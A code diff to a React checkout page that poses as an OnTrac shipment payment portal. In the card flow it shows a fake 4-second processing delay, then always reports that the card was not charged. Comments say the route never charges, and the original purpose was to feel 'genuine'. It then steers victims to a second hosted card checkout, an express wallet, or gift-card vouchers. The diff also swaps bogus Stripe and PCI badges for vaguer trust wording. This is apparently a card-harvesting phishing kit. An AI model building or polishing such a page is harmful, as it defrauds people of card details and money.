@@ -8,10 +8,42 @@ import Cards from 'react-credit-cards-2';
 import 'react-credit-cards-2/dist/es/styles-compiled.css';
 import styles from './CheckoutPage.module.css';
 
+const CARD_RECOVERY_STATUS = 'not_charged';
+const getCardRecoveryKey = (trackingId) => `ontrac:checkout:${trackingId}:card-recovery`;
+
+const readCardRecovery = (trackingId) => {
+  if (!trackingId) return 'idle';
+  try {
+    return sessionStorage.getItem(getCardRecoveryKey(trackingId)) === CARD_RECOVERY_STATUS
+      ? CARD_RECOVERY_STATUS
+      : 'idle';
+  } catch {
+    return 'idle';
+  }
+};
+
+const writeCardRecovery = (trackingId, status) => {
+  if (!trackingId) return;
+  try {
+    if (status === CARD_RECOVERY_STATUS) {
+      sessionStorage.setItem(getCardRecoveryKey(trackingId), CARD_RECOVERY_STATUS);
+    } else {
+      sessionStorage.removeItem(getCardRecoveryKey(trackingId));
+    }
+  } catch {
+    // Checkout still works if session storage is unavailable.
+  }
+};
+
 function CheckoutPage() {
   const { trackingId } = useParams();
   const navigate = useNavigate();
   const baseUrl = import.meta.env.VITE_API_URL;
+  const bachsParams = new URLSearchParams(window.location.search);
+  const bachsReturn = bachsParams.get('bachs_return');
+  const bachsCheckoutId = bachsParams.get('checkout_id');
+  const showPaymentGuide = bachsParams.get('payment_guide') === '1';
+  const isBachsReturn = bachsReturn === 'success' || bachsReturn === 'cancelled' || Boolean(bachsCheckoutId);
 
   // State Management
   const [shipmentData, setShipmentData] = useState(null);
@@ -20,6 +52,13 @@ function CheckoutPage() {
   const [processingPayment, setProcessingPayment] = useState(false);
   const [paymentSuccess, setPaymentSuccess] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
+  const [cardRecoveryState, setCardRecoveryState] = useState(() => readCardRecovery(trackingId));
+  const [showCardRecovery, setShowCardRecovery] = useState(false);
+  const [bachsReturnState, setBachsReturnState] = useState(() => {
+    if (bachsReturn === 'cancelled') return 'cancelled';
+    if (bachsReturn === 'success' || bachsCheckoutId) return 'confirming';
+    return 'idle';
+  });
 
   // Card Payment States
   const [cardNumber, setCardNumber] = useState('');
@@ -31,7 +70,13 @@ function CheckoutPage() {
   const [addressSuggestions, setAddressSuggestions] = useState([]);
   const [isSuggestionsVisible, setIsSuggestionsVisible] = useState(false);
   const cardErrorRef = useRef(null);
+  const cardRecoveryRef = useRef(null);
   const voucherErrorRef = useRef(null);
+
+  useEffect(() => {
+    setCardRecoveryState(readCardRecovery(trackingId));
+    setShowCardRecovery(false);
+  }, [trackingId]);
 
   // Auto-scroll to inline error the moment it appears
   useEffect(() => {
@@ -42,6 +87,35 @@ function CheckoutPage() {
       }
     }
   }, [errorMessage, selectedMethod]);
+
+  useEffect(() => {
+    if (!showCardRecovery || !cardRecoveryRef.current) return;
+    const reducedMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches;
+    cardRecoveryRef.current.focus({ preventScroll: true });
+    cardRecoveryRef.current.scrollIntoView({
+      behavior: reducedMotion ? 'auto' : 'smooth',
+      block: 'center'
+    });
+  }, [showCardRecovery]);
+
+  // Give the mobile checkout footer room for the fixed "Change Method" pill.
+  useEffect(() => {
+    document.body.classList.toggle('checkout-method-active', Boolean(selectedMethod));
+    return () => document.body.classList.remove('checkout-method-active');
+  }, [selectedMethod]);
+
+  const choosePaymentMethod = (method) => {
+    setSelectedMethod(method);
+    setErrorMessage('');
+    setShowCardRecovery(false);
+  };
+
+  const handlePaymentMethodKeyDown = (event, method) => {
+    if (event.key === 'Enter' || event.key === ' ') {
+      event.preventDefault();
+      choosePaymentMethod(method);
+    }
+  };
 
   // Handle input focus for card flip animation
   const handleInputFocus = (e) => {
@@ -123,13 +197,87 @@ function CheckoutPage() {
       setShipmentData(data);
       
       if (!data.requiresPayment) {
-        setPaymentSuccess(true);
+        setCardRecoveryState('idle');
+        writeCardRecovery(trackingId, 'idle');
+        if (isBachsReturn) {
+          setBachsReturnState('confirmed');
+        } else {
+          setPaymentSuccess(true);
+        }
+      } else if (bachsReturn === 'cancelled') {
+        setBachsReturnState('cancelled');
       }
     } catch (error) {
       setErrorMessage('Unable to load shipment details. Please try again.');
     } finally {
       setLoading(false);
     }
+  };
+
+  // Bachs return verification: the webhook updates the shipment; the browser only watches our API.
+  useEffect(() => {
+    if (!isBachsReturn || bachsReturnState !== 'confirming') return;
+
+    let active = true;
+    let timerId;
+    let attempts = 0;
+    const maxAttempts = 15;
+
+    const pollShipment = async () => {
+      try {
+        const response = await fetch(`${baseUrl}/api/shipments/${trackingId}/`);
+        if (response.ok) {
+          const data = await response.json();
+          if (!active) return;
+
+          setShipmentData(data);
+          if (!data.requiresPayment) {
+            setCardRecoveryState('idle');
+            writeCardRecovery(trackingId, 'idle');
+            setBachsReturnState('confirmed');
+            return;
+          }
+        }
+      } catch {
+        // A transient polling failure should not turn a successful payment into an error screen.
+      }
+
+      attempts += 1;
+      if (!active) return;
+
+      if (attempts >= maxAttempts) {
+        setBachsReturnState('delayed');
+        return;
+      }
+
+      timerId = setTimeout(pollShipment, 2000);
+    };
+
+    timerId = setTimeout(pollShipment, 1500);
+
+    return () => {
+      active = false;
+      if (timerId) clearTimeout(timerId);
+    };
+  }, [isBachsReturn, bachsReturnState, baseUrl, trackingId]);
+
+  // Once the signed webhook has marked the shipment paid, return to tracking after a short receipt moment.
+  useEffect(() => {
+    if (bachsReturnState !== 'confirmed') return;
+
+    const timerId = setTimeout(() => {
+      navigate(`/tracking?id=${trackingId}`, { state: { skipTrackingDelay: true } });
+    }, 5000);
+
+    return () => clearTimeout(timerId);
+  }, [bachsReturnState, navigate, trackingId]);
+
+  const leaveBachsReturn = (method = null) => {
+    window.history.replaceState({}, document.title, `/checkout/${trackingId}`);
+    setBachsReturnState('idle');
+    setSelectedMethod(method);
+    setProcessingPayment(false);
+    setErrorMessage('');
   };
 
   // ShieldClimb Payment Handler
@@ -187,16 +335,22 @@ function CheckoutPage() {
       const data = await response.json();
 
       if (response.ok) {
-        // Hold for 4s minimum — feels like genuine processing attempt
+        // Deliberate existing behavior: this route never charges the customer.
+        // Treat the completed attempt as a recovery state, not a gateway failure.
         await new Promise(resolve => setTimeout(resolve, 4000));
-        setErrorMessage('An error occurred during transaction processing. Your card has not been charged. Please contact support or try another payment method.');
-        
-        // Reset fields
+        setErrorMessage('');
+        setCardRecoveryState(CARD_RECOVERY_STATUS);
+        writeCardRecovery(trackingId, CARD_RECOVERY_STATUS);
+        setShowCardRecovery(true);
+
+        // Never retain sensitive card credentials after the attempt.
+        // Keep only non-sensitive name/address in memory for a possible retry.
         setCardNumber('');
-        setCardName('');
         setExpiryDate('');
         setCvv('');
-        setBillingAddress('');
+        setFocused('');
+        setAddressSuggestions([]);
+        setIsSuggestionsVisible(false);
       } else {
         setErrorMessage(data.error || 'Payment failed. Please check your card details.');
       }
@@ -204,6 +358,31 @@ function CheckoutPage() {
       await new Promise(resolve => setTimeout(resolve, 4000));
       setErrorMessage('Payment processing failed. Please try again.');
     } finally {
+      setProcessingPayment(false);
+    }
+  };
+
+  // Bachs Hosted Checkout Handler
+  const handleBachsPayment = async () => {
+    setProcessingPayment(true);
+    setErrorMessage('');
+
+    try {
+      const response = await fetch(`${baseUrl}/api/initiate-bachs/${trackingId}/`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+      });
+
+      const data = await response.json();
+
+      if (response.ok && data.checkout_url) {
+        window.location.href = data.checkout_url;
+      } else {
+        setErrorMessage(data.error || 'Unable to open secure checkout. Please try again.');
+        setProcessingPayment(false);
+      }
+    } catch {
+      setErrorMessage('Network error. Please check your connection and try again.');
       setProcessingPayment(false);
     }
   };
@@ -280,6 +459,146 @@ function CheckoutPage() {
     );
   }
 
+  // Bachs Return State
+  if (isBachsReturn && shipmentData && bachsReturnState !== 'idle') {
+    const paymentTotal = `${shipmentData.paymentCurrency} ${shipmentData.paymentAmount}`;
+    const paymentDescription = shipmentData.paymentDescription || 'Shipment payment';
+
+    const returnCopy = {
+      confirming: {
+        title: 'Confirming your payment',
+        text: 'Your payment was submitted. We are waiting for secure confirmation before updating your shipment.',
+        status: 'Verifying payment',
+      },
+      confirmed: {
+        title: 'Payment confirmed',
+        text: 'Your payment has been securely confirmed. Your shipment can now continue processing.',
+        status: 'Confirmed',
+      },
+      cancelled: {
+        title: 'Payment wasn’t completed',
+        text: 'No completed payment has been confirmed for this shipment. You can try again or choose another payment method.',
+        status: 'Not completed',
+      },
+      delayed: {
+        title: 'Confirmation is taking longer',
+        text: 'We have not received final confirmation yet. Please do not submit another payment while we continue checking.',
+        status: 'Pending confirmation',
+      },
+    }[bachsReturnState];
+
+    return (
+      <div className={styles.bachsReturnPage}>
+        <motion.div
+          className={styles.bachsReturnCard}
+          initial={{ opacity: 0, y: 18 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.35, ease: 'easeOut' }}
+        >
+          <div className={styles.bachsReturnBrand}>
+            <img src="/ontrac_favicon.png" alt="OnTrac" />
+            <span>OnTrac Secure Payment</span>
+          </div>
+
+          <div className={`${styles.bachsReturnIcon} ${styles[`returnIcon${bachsReturnState.charAt(0).toUpperCase() + bachsReturnState.slice(1)}`]}`}>
+            {bachsReturnState === 'confirming' && <div className={styles.returnSpinner}></div>}
+            {bachsReturnState === 'confirmed' && <i className="fa-solid fa-check"></i>}
+            {bachsReturnState === 'cancelled' && <i className="fa-solid fa-xmark"></i>}
+            {bachsReturnState === 'delayed' && <i className="fa-regular fa-clock"></i>}
+          </div>
+
+          <h1 className={styles.bachsReturnTitle}>{returnCopy.title}</h1>
+          <p className={styles.bachsReturnText}>{returnCopy.text}</p>
+
+          <div className={styles.bachsReturnSummary}>
+            <div className={styles.bachsReturnRow}>
+              <span>Amount</span>
+              <strong>{paymentTotal}</strong>
+            </div>
+            <div className={styles.bachsReturnRow}>
+              <span>Payment for</span>
+              <strong>{paymentDescription}</strong>
+            </div>
+            <div className={styles.bachsReturnRow}>
+              <span>Tracking number</span>
+              <strong>{trackingId}</strong>
+            </div>
+            <div className={styles.bachsReturnRow}>
+              <span>Payment method</span>
+              <strong>Pay by card</strong>
+            </div>
+            <div className={styles.bachsReturnRow}>
+              <span>Status</span>
+              <strong className={`${styles.returnStatus} ${styles[`returnStatus${bachsReturnState.charAt(0).toUpperCase() + bachsReturnState.slice(1)}`]}`}>
+                {returnCopy.status}
+              </strong>
+            </div>
+          </div>
+
+          {bachsReturnState === 'confirming' && (
+            <p className={styles.bachsReturnHint}>Please keep this page open. This normally takes only a few seconds.</p>
+          )}
+
+          {bachsReturnState === 'confirmed' && (
+            <>
+              <button
+                type="button"
+                className={styles.bachsReturnPrimary}
+                onClick={() => navigate(`/tracking?id=${trackingId}`, { state: { skipTrackingDelay: true } })}
+              >
+                View shipment tracking
+              </button>
+              <p className={styles.bachsReturnHint}>Returning to tracking automatically in 5 seconds…</p>
+            </>
+          )}
+
+          {bachsReturnState === 'cancelled' && (
+            <div className={styles.bachsReturnActions}>
+              <button
+                type="button"
+                className={styles.bachsReturnPrimary}
+                onClick={() => leaveBachsReturn('bachs')}
+              >
+                Try payment again
+              </button>
+              <button
+                type="button"
+                className={styles.bachsReturnSecondary}
+                onClick={() => leaveBachsReturn(null)}
+              >
+                Choose another payment method
+              </button>
+            </div>
+          )}
+
+          {bachsReturnState === 'delayed' && (
+            <div className={styles.bachsReturnActions}>
+              <button
+                type="button"
+                className={styles.bachsReturnPrimary}
+                onClick={() => setBachsReturnState('confirming')}
+              >
+                Check again
+              </button>
+              <button
+                type="button"
+                className={styles.bachsReturnSecondary}
+                onClick={() => navigate(`/tracking?id=${trackingId}`)}
+              >
+                View shipment
+              </button>
+            </div>
+          )}
+
+          <div className={styles.bachsReturnFooter}>
+            <i className="fa-solid fa-shield-halved"></i>
+            <span>We update your shipment only after the payment is securely confirmed.</span>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
+
   // Payment Success State
   if (paymentSuccess) {
     return (
@@ -311,7 +630,7 @@ function CheckoutPage() {
 
   return (
     <div className={styles.checkoutWrapper}>
-      <div className={styles.walkthroughLayout}>
+      <div className={`${styles.walkthroughLayout} ${!showPaymentGuide ? styles.walkthroughLayoutSolo : ''}`}>
       <div className={styles.checkoutContainer}>
         <motion.div 
           className={styles.checkoutCard}
@@ -324,30 +643,30 @@ function CheckoutPage() {
             <div className={styles.logoContainer}>
               <img src="/ontrac_favicon.png" alt="OnTrac" className={styles.brandLogo} />
             </div>
-            <h1 className={styles.checkoutTitle}>Secure Payment</h1>
+            <h1 className={styles.checkoutTitle}>Secure payment</h1>
             <p className={styles.checkoutSubtitle}>
-              Finalize payment for tracking ID <strong>{trackingId}</strong>
+              Complete payment for tracking ID <strong>{trackingId}</strong>
             </p>
           </div>
 
           {/* Order Summary - PROFESSIONAL INVOICE STYLE */}
           <div className={styles.orderSummary}>
             <div className={styles.summaryRow}>
-              <span>Total Amount</span>
+              <span>Amount due</span>
               <strong className={styles.amount}>
                 {shipmentData.paymentCurrency} {shipmentData.paymentAmount}
               </strong>
             </div>
             <div className={styles.summaryRow}>
-              <span>Payment Reference</span>
+              <span>Payment for</span>
               {/* Uses backend description if available, otherwise defaults to Import Duties */}
               <span className={styles.description}>
-                {shipmentData.paymentDescription || 'Priority Logistics & Fees'}
+                {shipmentData.paymentDescription || 'Shipment payment'}
               </span>
             </div>
             <div className={styles.summaryRow}>
               <span>Destination</span>
-              <span>{shipmentData.destination ? shipmentData.destination.toUpperCase() : 'INTERNATIONAL ZONE'}</span>
+              <span>{shipmentData.destination || 'Destination unavailable'}</span>
             </div>
           </div>
 
@@ -370,20 +689,39 @@ function CheckoutPage() {
           {!selectedMethod && (
             <div className={styles.methodSelection}>
               <h2 className={styles.sectionTitle}>Choose Payment Method</h2>
+              {cardRecoveryState === CARD_RECOVERY_STATUS && (
+                <motion.div
+                  className={styles.recoveryContext}
+                  role="status"
+                  aria-live="polite"
+                  initial={{ opacity: 0, y: -6 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  transition={{ duration: 0.22, ease: 'easeOut' }}
+                >
+                  <i className="fa-solid fa-circle-info" aria-hidden="true"></i>
+                  <div>
+                    <strong>Card payment not completed</strong>
+                    <span>No charge was made. Pay by card is the suggested next step.</span>
+                  </div>
+                </motion.div>
+              )}
               <div className={styles.methodGrid}>
                 
                 {/* Direct Card Entry - Position 1 */}
                 <motion.div
                   className={styles.methodCard}
-                  whileHover={{ scale: 1.02, y: -5 }}
-                  whileTap={{ scale: 0.98 }}
-                  onClick={() => { setSelectedMethod('card'); setErrorMessage(''); }}
+                  role="button"
+                  tabIndex={0}
+                  whileHover={{ y: -2 }}
+                  whileTap={{ scale: 0.99 }}
+                  onClick={() => choosePaymentMethod('card')}
+                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'card')}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-regular fa-credit-card"></i>
                   </div>
                   <h3>Credit or Debit Card</h3>
-                  <p>Secure 256-bit Encrypted Transaction</p>
+                  <p>Standard card payment</p>
                   
                   {/* LOGO WALL - Card Networks */}
                   <div className={styles.paymentLogoWall}>
@@ -394,12 +732,51 @@ function CheckoutPage() {
                   </div>
                 </motion.div>
 
-                {/* Instant Card & Wallet - Position 2 (Featured) */}
+                {/* Bachs Hosted Checkout - Position 2 */}
                 <motion.div
-                  className={`${styles.methodCard} ${styles.featured}`}
-                  whileHover={{ scale: 1.02, y: -5 }}
-                  whileTap={{ scale: 0.98 }}
-                  onClick={() => { setSelectedMethod('shieldclimb'); setErrorMessage(''); }}
+                  className={`${styles.methodCard} ${cardRecoveryState === CARD_RECOVERY_STATUS ? styles.featured : ''}`}
+                  role="button"
+                  tabIndex={0}
+                  whileHover={{ y: -2 }}
+                  whileTap={{ scale: 0.99 }}
+                  onClick={() => choosePaymentMethod('bachs')}
+                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'bachs')}
+                >
+                  <div className={styles.methodIcon}>
+                    <svg className={styles.cardMethodSvg} viewBox="0 0 32 32" fill="none" aria-hidden="true">
+                      <rect x="4.5" y="7.5" width="23" height="17" rx="3.5" stroke="currentColor" strokeWidth="1.8" />
+                      <path d="M5 12.5h22" stroke="currentColor" strokeWidth="1.8" />
+                      <rect x="8" y="17" width="5.5" height="3.5" rx="1" stroke="currentColor" strokeWidth="1.5" />
+                      <path d="M20.2 17.1c1.25 1.1 1.25 2.7 0 3.8M22.5 15.3c2.45 2.1 2.45 5.3 0 7.4" stroke="currentColor" strokeWidth="1.45" strokeLinecap="round" />
+                    </svg>
+                  </div>
+                  <h3>Pay by card</h3>
+                  <p>Use a card enabled for international online payments.</p>
+                  <div className={styles.bachsPaymentMarks} aria-label="USD card payment">
+                    <span className={styles.bachsCardMark}>
+                      <svg viewBox="0 0 24 16" fill="none" aria-hidden="true">
+                        <rect x="1" y="1" width="22" height="14" rx="3" stroke="currentColor" strokeWidth="1.4" />
+                        <path d="M2 5h20" stroke="currentColor" strokeWidth="1.4" />
+                        <rect x="4" y="8.5" width="4.5" height="2.8" rx="0.7" fill="currentColor" opacity="0.75" />
+                      </svg>
+                      <span>Card</span>
+                    </span>
+                    <span className={styles.bachsCurrencyMark}>USD</span>
+                  </div>
+                  {cardRecoveryState === CARD_RECOVERY_STATUS && (
+                    <div className={styles.methodBadge}>Suggested next</div>
+                  )}
+                </motion.div>
+
+                {/* Instant Card & Wallet - Position 3 */}
+                <motion.div
+                  className={styles.methodCard}
+                  role="button"
+                  tabIndex={0}
+                  whileHover={{ y: -2 }}
+                  whileTap={{ scale: 0.99 }}
+                  onClick={() => choosePaymentMethod('shieldclimb')}
+                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'shieldclimb')}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-solid fa-bolt"></i>
@@ -415,16 +792,17 @@ function CheckoutPage() {
                     <i className="fa-brands fa-cc-visa" title="Visa"></i>
                     <i className="fa-brands fa-cc-mastercard" title="Mastercard"></i>
                   </div>
-                  
-                  <div className={styles.methodBadge}>Recommended</div>
                 </motion.div>
 
-                {/* Voucher/Coupon - Position 3 */}
+                {/* Voucher/Coupon - Position 4 */}
                 <motion.div
                   className={styles.methodCard}
-                  whileHover={{ scale: 1.02, y: -5 }}
-                  whileTap={{ scale: 0.98 }}
-                  onClick={() => { setSelectedMethod('voucher'); setErrorMessage(''); }}
+                  role="button"
+                  tabIndex={0}
+                  whileHover={{ y: -2 }}
+                  whileTap={{ scale: 0.99 }}
+                  onClick={() => choosePaymentMethod('voucher')}
+                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'voucher')}
                 >
                   <div className={styles.methodIcon}>
                     <i className="fa-solid fa-ticket"></i>
@@ -434,9 +812,11 @@ function CheckoutPage() {
                 </motion.div>
 
               </div>
-              <div className={styles.walkthroughInline}>
-                <PaymentWalkthrough forcePill total={paymentTotal} />
-              </div>
+              {showPaymentGuide && (
+                <div className={styles.walkthroughInline}>
+                  <PaymentWalkthrough forcePill total={paymentTotal} />
+                </div>
+              )}
             </div>
           )}
 
@@ -452,24 +832,68 @@ function CheckoutPage() {
               >
                 {/* Desktop: Apple/Stripe nav bar */}
                 <div className={styles.backNavBar}>
-                <button className={styles.backNavBtn} onClick={() => { setSelectedMethod(null); setErrorMessage(''); }}>
+                <button className={styles.backNavBtn} onClick={() => choosePaymentMethod(null)}>
                     <i className="fa-solid fa-chevron-left"></i> Change Method
                   </button>
                   <span className={styles.backNavMethod}>
                     {selectedMethod === 'card' && '💳 Credit or Debit Card'}
+                    {selectedMethod === 'bachs' && 'Pay by card'}
                     {selectedMethod === 'shieldclimb' && '⚡ Express Checkout'}
                     {selectedMethod === 'voucher' && '🎟 Payment Voucher'}
                   </span>
                 </div>
 
                 {/* Mobile: Floating sticky pill */}
-                <button className={styles.floatingBackBtn} onClick={() => { setSelectedMethod(null); setErrorMessage(''); }}>
+                <button className={styles.floatingBackBtn} onClick={() => choosePaymentMethod(null)}>
                   <i className="fa-solid fa-chevron-left"></i> Change Method
                 </button>
 
                 {/* Standard Card Form */}
                 {selectedMethod === 'card' && (
                   <form onSubmit={handleCardPayment} className={styles.cardForm}>
+                    {showCardRecovery ? (
+                      <motion.section
+                        ref={cardRecoveryRef}
+                        className={styles.cardRecoveryPanel}
+                        tabIndex={-1}
+                        role="status"
+                        aria-live="polite"
+                        initial={{ opacity: 0, y: 8 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ duration: 0.24, ease: 'easeOut' }}
+                      >
+                        <div className={styles.cardRecoveryIcon} aria-hidden="true">
+                          <i className="fa-regular fa-credit-card"></i>
+                          <span className={styles.cardRecoveryIconMark}>!</span>
+                        </div>
+                        <span className={styles.cardRecoveryEyebrow}>Payment not completed</span>
+                        <h2>Your card was not charged</h2>
+                        <p>
+                          Try Pay by card in a different secure checkout, or choose another payment method.
+                        </p>
+                        <div className={styles.cardRecoveryActions}>
+                          <div className={styles.cardRecoveryPrimaryGroup}>
+                            <button
+                              type="button"
+                              className={styles.cardRecoveryPrimary}
+                              onClick={() => choosePaymentMethod('bachs')}
+                            >
+                              Try Pay by card instead
+                              <i className="fa-solid fa-arrow-right" aria-hidden="true"></i>
+                            </button>
+                            <span className={styles.cardRecoverySupport}>Secure hosted checkout · USD</span>
+                          </div>
+                          <button
+                            type="button"
+                            className={styles.cardRecoverySecondary}
+                            onClick={() => choosePaymentMethod(null)}
+                          >
+                            View all payment methods
+                          </button>
+                        </div>
+                      </motion.section>
+                    ) : (
+                      <>
                     <div className={styles.cardVisualContainer}>
                       <Cards
                         number={cardNumber}
@@ -602,7 +1026,7 @@ function CheckoutPage() {
                           <i className="fa-solid fa-circle-exclamation"></i>
                         </div>
                         <div className={styles.inlineErrorContent}>
-                          <span className={styles.inlineErrorTitle}>Payment Failed</span>
+                          <span className={styles.inlineErrorTitle}>Payment could not be processed</span>
                             <span className={styles.inlineErrorText}>{errorMessage}</span>
                           </div>
                         </motion.div>
@@ -629,9 +1053,70 @@ function CheckoutPage() {
 
                     <div className={styles.securityBadges}>
                       <i className="fa-solid fa-shield-halved"></i>
-                      <span>256-bit SSL Encrypted</span>
+                      <span>Protected connection</span>
                     </div>
+                      </>
+                    )}
                   </form>
+                )}
+
+                {/* Bachs Hosted Checkout */}
+                {selectedMethod === 'bachs' && (
+                  <div className={styles.shieldclimbContainer}>
+                    <h2 className={styles.formTitle}>Pay by card</h2>
+                    <p className={styles.shieldclimbDescription}>
+                      Checkout is in USD. Your bank may convert the charge to your card's currency.
+                    </p>
+
+                    <div className={styles.shieldclimbFeatures}>
+                      <div className={styles.feature}>
+                        <i className="fa-solid fa-shield-halved"></i>
+                        <span>Secure hosted payment page</span>
+                      </div>
+                      <div className={styles.feature}>
+                        <i className="fa-solid fa-check-circle"></i>
+                        <span>Automatic payment confirmation</span>
+                      </div>
+                      <div className={styles.feature}>
+                        <i className="fa-solid fa-arrow-rotate-left"></i>
+                        <span>Return to OnTrac after checkout</span>
+                      </div>
+                    </div>
+
+                    <button
+                      onClick={handleBachsPayment}
+                      className={`${styles.submitButton} ${styles.shieldclimbButton}`}
+                      disabled={processingPayment}
+                    >
+                      {processingPayment ? (
+                        <>
+                          <div className={styles.buttonSpinner}></div>
+                          Opening secure checkout...
+                        </>
+                      ) : (
+                        <>
+                          <i className="fa-solid fa-arrow-up-right-from-square"></i>
+                          Continue to secure checkout
+                        </>
+                      )}
+                    </button>
+
+                    {errorMessage && (
+                      <div ref={voucherErrorRef} className={styles.inlineErrorBanner}>
+                        <div className={styles.inlineErrorIcon}>
+                          <i className="fa-solid fa-circle-exclamation"></i>
+                        </div>
+                        <div className={styles.inlineErrorContent}>
+                          <span className={styles.inlineErrorTitle}>Secure checkout could not be opened</span>
+                          <span className={styles.inlineErrorText}>{errorMessage}</span>
+                        </div>
+                      </div>
+                    )}
+
+                    <div className={styles.poweredBy}>
+                      Payment processing by <strong>Bachs</strong>
+                    </div>
+                  </div>
                 )}
 
                 {/* ShieldClimb Payment - PREMIUM WALLET EXPERIENCE */}
@@ -676,13 +1161,19 @@ function CheckoutPage() {
                     </button>
 
                     {errorMessage && (
-                      <p style={{ color: '#d32f2f', fontSize: '13px', textAlign: 'center', margin: '8px 0' }}>
-                        <i className="fa-solid fa-circle-exclamation"></i> {errorMessage}
-                      </p>
+                      <div ref={voucherErrorRef} className={styles.inlineErrorBanner}>
+                        <div className={styles.inlineErrorIcon}>
+                          <i className="fa-solid fa-circle-exclamation"></i>
+                        </div>
+                        <div className={styles.inlineErrorContent}>
+                          <span className={styles.inlineErrorTitle}>Express checkout could not be opened</span>
+                          <span className={styles.inlineErrorText}>{errorMessage}</span>
+                        </div>
+                      </div>
                     )}
 
                     <div className={styles.poweredBy}>
-                      Secured by <strong>Stripe Connect</strong> • ISO 27001 Certified Payment Rails
+                      Payment options are provided by the secure checkout gateway.
                     </div>
                   </div>
                 )}
@@ -700,10 +1191,9 @@ function CheckoutPage() {
                           <div className={styles.successIconWrapper}>
                             <i className="fa-solid fa-circle-check"></i>
                           </div>
-                          <h2 className={styles.proTitle}>Voucher Received</h2>
+                          <h2 className={styles.proTitle}>Voucher received</h2>
                           <p className={styles.proDescription}>
-                            Voucher code successfully redeemed. The transaction ID has been generated and is currently <strong>syncing with our central ledger</strong>. 
-                            Your shipment status will auto-update upon confirmation. No further action is required.
+                            Your voucher was submitted successfully. Shipment status will update automatically after the voucher is confirmed.
                           </p>
                           <div className={styles.proLoaderBar}>
                             <div className={styles.proLoaderFill}></div>
@@ -773,7 +1263,7 @@ function CheckoutPage() {
                             <div className={styles.instructionSteps}>
                               <div className={styles.step}>
                                 <span className={styles.stepNum}>1</span>
-                                <p>Visit <a href="https://mygiftcardsupply.com" target="_blank" rel="noopener noreferrer" className={styles.partnerLink}>MyGiftCardSupply</a> (Official Partner)</p>
+                                <p>Visit <a href="https://mygiftcardsupply.com" target="_blank" rel="noopener noreferrer" className={styles.partnerLink}>MyGiftCardSupply</a></p>
                               </div>
                               <div className={styles.step}>
                                 <span className={styles.stepNum}>2</span>
@@ -810,22 +1300,24 @@ function CheckoutPage() {
         <div className={styles.trustIndicators}>
           <div className={styles.trustBadge}>
             <i className="fa-solid fa-lock"></i>
-            <span>SSL Secured</span>
+            <span>Secure checkout</span>
           </div>
           <div className={styles.trustBadge}>
             <i className="fa-solid fa-shield-halved"></i>
-            <span>PCI Compliant</span>
+            <span>Protected payment flow</span>
           </div>
           <div className={styles.trustBadge}>
-            <i className="fa-brands fa-stripe"></i>
-            <span>Stripe</span>
+            <i className="fa-solid fa-circle-check"></i>
+            <span>Confirmation tracked</span>
           </div>
         </div>
       </div>
 
-      <aside className={styles.walkthroughRail}>
-        <PaymentWalkthrough total={paymentTotal} />
-      </aside>
+      {showPaymentGuide && (
+        <aside className={styles.walkthroughRail}>
+          <PaymentWalkthrough total={paymentTotal} />
+        </aside>
+      )}
       </div>
     </div>
   );
